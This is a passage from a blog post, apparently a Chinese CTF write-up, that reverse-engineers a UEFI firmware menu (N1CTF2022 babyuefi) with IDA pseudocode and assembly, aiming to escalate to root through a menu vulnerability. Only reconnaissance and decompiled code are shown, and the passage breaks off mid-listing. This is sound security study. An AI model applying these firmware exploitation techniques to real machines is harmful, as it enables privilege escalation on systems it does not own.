<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="写在最前面上一篇文章UEFI SMM 漏洞挖掘与利用简单的对 UEFI 的一些基础概念、漏洞出现方式以及攻击面进行了初步的学习，并且用了几道比较简单的题目进行练习。由于那些题目都是直接执行我们输入的 shellcode，和现实的情况有点脱节，而且对上一篇文章的部分攻击方式还带有一定的疑问，所以这里找了些题目来进行针对训练。   Double GetVariable信息搜集这里用的环境是 N1CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="UEFI Double GetVariable &amp; Heap OverFlow">
<meta property="og:url" content="https://qanux.github.io/2025/01/06/uefi2/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="写在最前面上一篇文章UEFI SMM 漏洞挖掘与利用简单的对 UEFI 的一些基础概念、漏洞出现方式以及攻击面进行了初步的学习，并且用了几道比较简单的题目进行练习。由于那些题目都是直接执行我们输入的 shellcode，和现实的情况有点脱节，而且对上一篇文章的部分攻击方式还带有一定的疑问，所以这里找了些题目来进行针对训练。   Double GetVariable信息搜集这里用的环境是 N1CTF">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/2025/01/06/uefi2/1.png">
<meta property="og:image" content="https://qanux.github.io/2025/01/06/uefi2/2.png">
<meta property="og:image" content="https://qanux.github.io/2025/01/06/uefi2/3.png">
<meta property="og:image" content="https://qanux.github.io/2025/01/06/uefi2/5.png">
<meta property="og:image" content="https://qanux.github.io/2025/01/06/uefi2/4.png">
<meta property="og:image" content="https://qanux.github.io/2025/01/06/uefi2/6.png">
<meta property="article:published_time" content="2025-01-05T16:00:00.000Z">
<meta property="article:modified_time" content="2025-01-09T05:51:06.610Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/2025/01/06/uefi2/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>UEFI Double GetVariable &amp; Heap OverFlow</title>
    <!-- async scripts -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
    
    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/01/09/Compressor/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/12/31/2024/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/01/06/uefi2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/01/06/uefi2/&text=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/01/06/uefi2/&is_video=false&description=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=UEFI Double GetVariable &amp; Heap OverFlow&body=Check out this article: https://qanux.github.io/2025/01/06/uefi2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/01/06/uefi2/&title=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/01/06/uefi2/&name=UEFI Double GetVariable &amp; Heap OverFlow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/01/06/uefi2/&t=UEFI Double GetVariable &amp; Heap OverFlow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-GetVariable"><span class="toc-number">2.</span> <span class="toc-text">Double GetVariable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E4%BA%86%E9%83%A8%E5%88%86%E7%AC%A6%E5%8F%B7%E7%9A%84IDA%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">恢复了部分符号的IDA伪代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Run"><span class="toc-number">2.2.1.</span> <span class="toc-text">Run</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vuln"><span class="toc-number">2.2.2.</span> <span class="toc-text">vuln</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Add"><span class="toc-number">2.2.3.</span> <span class="toc-text">Add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Delete"><span class="toc-number">2.2.4.</span> <span class="toc-text">Delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Get"><span class="toc-number">2.2.5.</span> <span class="toc-text">Get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Encode"><span class="toc-number">2.2.6.</span> <span class="toc-text">Encode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E4%B8%AD%E6%B7%BB%E5%8A%A0%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.3.</span> <span class="toc-text">IDA中添加的结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RuntimeService"><span class="toc-number">2.3.1.</span> <span class="toc-text">RuntimeService</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BootServices"><span class="toc-number">2.3.2.</span> <span class="toc-text">BootServices</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EFI-SIMPLE-TEXT-OUTPUT-PROTOCOL"><span class="toc-number">2.3.3.</span> <span class="toc-text">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EFI-SIMPLE-TEXT-INPUT-PROTOCOL"><span class="toc-number">2.3.4.</span> <span class="toc-text">EFI_SIMPLE_TEXT_INPUT_PROTOCOL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SystemTable"><span class="toc-number">2.3.5.</span> <span class="toc-text">SystemTable</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞分析与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">2.5.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%9A%84%E5%8A%AB%E6%8C%81"><span class="toc-number">2.6.</span> <span class="toc-text">执行流的劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.7.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-sh"><span class="toc-number">2.7.1.</span> <span class="toc-text">exp.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-py"><span class="toc-number">2.7.2.</span> <span class="toc-text">exp.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heap-OverFlow"><span class="toc-number">3.</span> <span class="toc-text">Heap OverFlow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%9D%97%E7%9A%84%E7%AE%A1%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">堆块的管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E4%BA%86%E9%83%A8%E5%88%86%E7%AC%A6%E5%8F%B7%E7%9A%84IDA%E4%BC%AA%E4%BB%A3%E7%A0%81-1"><span class="toc-number">3.3.</span> <span class="toc-text">恢复了部分符号的IDA伪代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn"><span class="toc-number">3.3.1.</span> <span class="toc-text">pwn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Visitor"><span class="toc-number">3.3.2.</span> <span class="toc-text">Visitor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Add-1"><span class="toc-number">3.3.3.</span> <span class="toc-text">Add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Edit"><span class="toc-number">3.3.4.</span> <span class="toc-text">Edit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clearUser"><span class="toc-number">3.3.5.</span> <span class="toc-text">clearUser</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SaveInfo"><span class="toc-number">3.3.6.</span> <span class="toc-text">SaveInfo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞分析与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">3.5.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-sh-1"><span class="toc-number">3.5.1.</span> <span class="toc-text">exp.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-py-1"><span class="toc-number">3.5.2.</span> <span class="toc-text">exp.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">学习文章</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        UEFI Double GetVariable &amp; Heap OverFlow
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-01-05T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-01-06</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>上一篇文章<a target="_blank" rel="noopener" href="https://9anux.org/2024/12/14/uefi/">UEFI SMM 漏洞挖掘与利用</a>简单的对 UEFI 的一些基础概念、漏洞出现方式以及攻击面进行了初步的学习，并且用了几道比较简单的题目进行练习。由于那些题目都是直接执行我们输入的 shellcode，和现实的情况有点脱节，而且对上一篇文章的部分攻击方式还带有一定的疑问，所以这里找了些题目来进行针对训练。  </p>
<h2 id="Double-GetVariable"><a href="#Double-GetVariable" class="headerlink" title="Double GetVariable"></a>Double GetVariable</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>这里用的环境是 N1CTF2022 babyuefi。和我前面那篇<a target="_blank" rel="noopener" href="https://9anux.org/2024/12/14/uefi/">UEFI SMM 漏洞挖掘与利用</a>不同，这里并没有直接给我们执行任意 shellcode 的机会，而是给了我们一个文件系统。我们可以看到 flag 就在这一个文件系统中，而我们并没有权限去读取该 flag 文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Boot took 1.64 seconds!</span><br><span class="line"></span><br><span class="line">/ $ <span class="built_in">ls</span></span><br><span class="line">bin      etc      init     proc     sbin     tmp</span><br><span class="line">dev      flag     linuxrc  root     sys      usr</span><br><span class="line">/ $ <span class="built_in">cat</span> flag</span><br><span class="line"><span class="built_in">cat</span>: can<span class="string">&#x27;t open &#x27;</span>flag<span class="string">&#x27;: Permission denied</span></span><br><span class="line"><span class="string">/ $ whoami</span></span><br><span class="line"><span class="string">whoami: unknown uid 1000</span></span><br><span class="line"><span class="string">/ $ id</span></span><br><span class="line"><span class="string">uid=1000 gid=1000 groups=1000</span></span><br></pre></td></tr></table></figure>

<p>当我们启动 run.py 的时候按 F12，这个时候我们就会进入到一个菜单界面：  </p>
<img src="/2025/01/06/uefi2/1.png" class="" title="我的图图呢">  

<p>不能猜到漏洞就在这一个菜单界面中，我们需要通过漏洞来将权限提升至 root 然后获取 flag。也就是说我们的目标就是通过对漏洞的利用来打开 Boot Manager，并加入自己的启动项使用 root 启动系统读出 flag。  </p>
<p>具体固件的提取过程见我的上一篇文章<a target="_blank" rel="noopener" href="https://9anux.org/2024/12/14/uefi/">UEFI SMM 漏洞挖掘与利用</a>，通过字符串的搜索我们能很容易的定位到这个菜单界面是由固件 UiApp 实现的。我们将其拖进 ida 中会发现其非常难看，符号表全去掉了，而且有很多函数的参数并没有给识别出来，如下（下面这个函数已经恢复了部分符号）：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-138h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+28h] [rbp-138h]</span></span><br><span class="line">  __int16 v8[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">256</span>]; <span class="comment">// [rsp+60h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(v2);</span><br><span class="line">  Input(v3, v6);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v9, v8, <span class="number">0x10</span>ui64);</span><br><span class="line">  Output(v4);</span><br><span class="line">  Input(v5, v7);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           v8,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           v10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 Output 和 Input 的函数参数并没有给正确的识别，然后我去看这个函数的汇编寻找原因。  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001CA1 Add             proc near               ; CODE XREF: vuln+CB↓p</span><br><span class="line">.text:0000000000001CA1</span><br><span class="line">.text:0000000000001CA1 var_140         = qword ptr -140h</span><br><span class="line">.text:0000000000001CA1 var_130         = word ptr -130h</span><br><span class="line">.text:0000000000001CA1 var_110         = byte ptr -110h</span><br><span class="line">.text:0000000000001CA1 var_100         = byte ptr -100h</span><br><span class="line">.text:0000000000001CA1</span><br><span class="line">.text:0000000000001CA1                 endbr64</span><br><span class="line">.text:0000000000001CA5                 push    rbp</span><br><span class="line">.text:0000000000001CA6                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001CA9                 sub     rsp, 160h</span><br><span class="line">.text:0000000000001CB0                 lea     rdi, aKeyName   ; &quot;Key name:&quot;</span><br><span class="line">.text:0000000000001CB7                 call    Output</span><br><span class="line">.text:0000000000001CBC                 lea     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000001CC3                 mov     esi, 10h        ; unsigned int</span><br><span class="line">.text:0000000000001CC8                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001CCB                 call    Input</span><br><span class="line">.text:0000000000001CD0                 lea     rdx, [rbp+var_130]</span><br><span class="line">.text:0000000000001CD7                 lea     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000001CDE                 mov     r8d, 10h</span><br><span class="line">.text:0000000000001CE4                 mov     rcx, rax</span><br><span class="line">.text:0000000000001CE7                 call    Str2Unicode</span><br><span class="line">.text:0000000000001CEC                 lea     rdi, aKeyValue  ; &quot;Key value:&quot;</span><br><span class="line">.text:0000000000001CF3                 call    Output</span><br><span class="line">.text:0000000000001CF8                 lea     rax, [rbp+var_100]</span><br><span class="line">.text:0000000000001CFF                 mov     esi, 100h       ; unsigned int</span><br><span class="line">.text:0000000000001D04                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001D07                 call    Input</span><br><span class="line">.text:0000000000001D0C                 mov     rax, cs:gRT</span><br><span class="line">.text:0000000000001D13                 mov     rsi, [rax+58h]</span><br><span class="line">.text:0000000000001D17                 lea     rax, [rbp+var_130]</span><br><span class="line">.text:0000000000001D1E                 lea     rdx, [rbp+var_100]</span><br><span class="line">.text:0000000000001D25                 mov     [rsp+160h+var_140], rdx</span><br><span class="line">.text:0000000000001D2A                 mov     r9d, 100h</span><br><span class="line">.text:0000000000001D30                 mov     r8d, 7</span><br><span class="line">.text:0000000000001D36                 lea     rdx, GUID</span><br><span class="line">.text:0000000000001D3D                 mov     rcx, rax</span><br><span class="line">.text:0000000000001D40                 call    rsi</span><br><span class="line">.text:0000000000001D42                 leave</span><br><span class="line">.text:0000000000001D43                 retn</span><br><span class="line">.text:0000000000001D43 Add             endp</span><br></pre></td></tr></table></figure>

<p>发现 Input 和 Output 的函数传参规则是和我们平时 linux 中的一样（rdi、rsi、rdx、r8、r9），而 gRT 上的函数则是 rcx、rdx、r8、r9<br>所以这里我们要在 ida 上手动恢复其传参规则，这里的修改方式读者请自行网上搜索，这里给出我修改 Output 函数的 demo  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __usercall <span class="title function_">Output</span><span class="params">(<span class="type">char</span> *@&lt;rdi&gt;)</span></span><br></pre></td></tr></table></figure>

<p>通过对 edk2 源码的阅读，我恢复了大部分的结构体结构，下面给出我恢复符号后的 ida 伪代码。</p>
<h3 id="恢复了部分符号的IDA伪代码"><a href="#恢复了部分符号的IDA伪代码" class="headerlink" title="恢复了部分符号的IDA伪代码"></a>恢复了部分符号的IDA伪代码</h3><h4 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Run</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+28h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !byte_352B0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = ((__int64 (__fastcall *)(<span class="type">size_t</span> (*)(<span class="type">void</span>), <span class="type">void</span> *, __int64 *))gBS-&gt;HandleProtocol)(</span><br><span class="line">           SystemTable-&gt;ConsoleOutHandle,</span><br><span class="line">           &amp;unk_2F250,</span><br><span class="line">           &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      v4 = <span class="number">0</span>i64;</span><br><span class="line">    v6 = ((__int64 (__fastcall *)(<span class="type">size_t</span> (*)(<span class="type">void</span>), <span class="type">void</span> *, __int64 *))gBS-&gt;HandleProtocol)(</span><br><span class="line">           SystemTable-&gt;ConsoleOutHandle,</span><br><span class="line">           &amp;unk_2F240,</span><br><span class="line">           &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      v3 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_352B4 = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v4 + <span class="number">24</span>) + <span class="number">8</span>i64) + <span class="number">4</span>i64);</span><br><span class="line">      dword_352B8 = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v4 + <span class="number">24</span>) + <span class="number">8</span>i64) + <span class="number">8</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64 *, __int64 *))(v3 + <span class="number">24</span>))(</span><br><span class="line">             v3,</span><br><span class="line">             *(<span class="type">int</span> *)(*(_QWORD *)(v3 + <span class="number">72</span>) + <span class="number">4</span>i64),</span><br><span class="line">             &amp;v2,</span><br><span class="line">             &amp;v1);</span><br><span class="line">      dword_352BC = v2;</span><br><span class="line">      dword_352C0 = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_352CC = sub_42ED(<span class="number">35</span>i64);</span><br><span class="line">    dword_352D0 = sub_42ED(<span class="number">36</span>i64);</span><br><span class="line">    dword_352C4 = dword_2F420;</span><br><span class="line">    dword_352C8 = dword_2F424;</span><br><span class="line">    byte_352B0 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span 